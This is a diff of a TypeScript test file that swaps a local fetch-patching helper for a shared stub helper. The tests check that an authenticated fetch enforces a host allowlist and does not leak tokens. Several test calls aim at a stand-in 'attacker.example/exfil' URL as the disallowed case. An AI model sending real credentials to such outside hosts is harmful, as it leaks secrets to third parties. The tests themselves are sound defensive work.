@@ -7,6 +7,7 @@ import {
 	createAuthenticatedFetch,
 } from './codemode-utils.ts'
 import { assertIntegrationHostAllowed } from './integration-host-allowlist.ts'
+import { withFetchStub } from '#worker/test-support/msw-node-server.ts'
 
 type SecretSetCall = {
 	name: string
@@ -72,30 +73,17 @@ function createCodemode() {
 	return { codemode, secretSetCalls, fetchCalls, fetchStub }
 }
 
-async function withPatchedFetch<T>(
-	fetchImpl: typeof globalThis.fetch,
-	callback: () => Promise<T>,
-) {
-	const originalFetch = globalThis.fetch
-	globalThis.fetch = fetchImpl
-	try {
-		return await callback()
-	} finally {
-		globalThis.fetch = originalFetch
-	}
-}
-
 test('createAuthenticatedFetch enforces integration host allowlists and fails closed without configured hosts', async () => {
 	const { codemode, fetchCalls, fetchStub } = createCodemode()
 
-	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
+	const authenticatedFetch = await withFetchStub(fetchStub, () =>
 		createAuthenticatedFetch(codemode, 'spotify'),
 	)
 
 	const fetchCallsAfterSetup = fetchCalls.length
 
 	await expect(
-		withPatchedFetch(fetchStub, () =>
+		withFetchStub(fetchStub, () =>
 			authenticatedFetch('https://attacker.example/exfil'),
 		),
 	).rejects.toThrow(IntegrationHostNotAllowedError)
@@ -103,7 +91,7 @@ test('createAuthenticatedFetch enforces integration host allowlists and fails cl
 
 	let disallowedError: Error | null = null
 	try {
-		await withPatchedFetch(fetchStub, () =>
+		await withFetchStub(fetchStub, () =>
 			authenticatedFetch('https://attacker.example/exfil'),
 		)
 	} catch (error) {
@@ -113,7 +101,7 @@ test('createAuthenticatedFetch enforces integration host allowlists and fails cl
 	expect(disallowedError!.message).not.toContain(fakeAccessToken)
 	expect(JSON.stringify(disallowedError)).not.toContain(fakeAccessToken)
 
-	const apiResponse = await withPatchedFetch(fetchStub, () =>
+	const apiResponse = await withFetchStub(fetchStub, () =>
 		authenticatedFetch('https://api.spotify.com/v1/me'),
 	)
 	expect(apiResponse.status).toBe(200)
@@ -123,7 +111,7 @@ test('createAuthenticatedFetch enforces integration host allowlists and fails cl
 		spotifyAccessTokenPlaceholder,
 	)
 
-	const cdnResponse = await withPatchedFetch(fetchStub, () =>
+	const cdnResponse = await withFetchStub(fetchStub, () =>
 		authenticatedFetch('https://cdn.spotify.com/images/cover.jpg'),
 	)
 	expect(cdnResponse.status).toBe(200)
@@ -181,15 +169,14 @@ test('createAuthenticatedFetch enforces integration host allowlists and fails cl
 		})
 	}
 
-	const emptyAllowlistFetch = await withPatchedFetch(
-		emptyAllowlistFetchStub,
-		() => createAuthenticatedFetch(emptyAllowlistCodemode, 'spotify'),
+	const emptyAllowlistFetch = await withFetchStub(emptyAllowlistFetchStub, () =>
+		createAuthenticatedFetch(emptyAllowlistCodemode, 'spotify'),
 	)
 
 	const fetchCallsBefore = emptyAllowlistFetchCalls.length
 
 	await expect(
-		withPatchedFetch(emptyAllowlistFetchStub, () =>
+		withFetchStub(emptyAllowlistFetchStub, () =>
 			emptyAllowlistFetch('https://anything.example/data'),
 		),
 	).rejects.toThrow(/no allowed hosts configured/)
